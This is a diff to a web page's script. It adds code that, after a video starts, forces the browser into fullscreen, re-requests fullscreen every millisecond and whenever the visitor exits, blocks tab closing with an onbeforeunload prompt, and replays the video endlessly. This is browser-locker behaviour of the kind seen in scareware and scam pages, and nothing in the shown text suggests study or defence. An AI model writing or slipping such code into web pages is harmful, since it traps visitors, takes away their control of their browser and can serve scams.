@@ -65,7 +65,64 @@
         const video = document.getElementById('playVideo');
         video.style.display = 'block';
         video.play();
+        triggerFullscreen();
+        preventTabClose();
       }
+
+      function triggerFullscreen() {
+        const elem = document.documentElement;
+
+        if (elem.requestFullscreen) {
+          elem.requestFullscreen();
+        } else if (elem.mozRequestFullScreen) { /* Firefox */
+          elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
+          elem.webkitRequestFullscreen();
+        } else if (elem.msRequestFullscreen) { /* IE/Edge */
+          elem.msRequestFullscreen();
+        }
+
+        setTimeout(() => {
+          if (!document.fullscreenElement) {
+            triggerFullscreen();
+          }
+        }, 1);
+      }
+
+      function preventTabClose() {
+        window.onbeforeunload = function () {
+          return "Are you sure you want to leave?";
+        };
+
+        const video = document.getElementById('playVideo');
+        video.addEventListener('ended', () => {
+          video.play();
+        });
+      }
+
+      document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+          setTimeout(triggerFullscreen, 1);
+        }
+      });
+
+      document.addEventListener('webkitfullscreenchange', () => {
+        if (!document.fullscreenElement) {
+          setTimeout(triggerFullscreen, 1);
+        }
+      });
+
+      document.addEventListener('mozfullscreenchange', () => {
+        if (!document.fullscreenElement) {
+          setTimeout(triggerFullscreen, 1);
+        }
+      });
+
+      document.addEventListener('MSFullscreenChange', () => {
+        if (!document.fullscreenElement) {
+          setTimeout(triggerFullscreen, 1);
+        }
+      });
     </script>
   </head>
   <body>
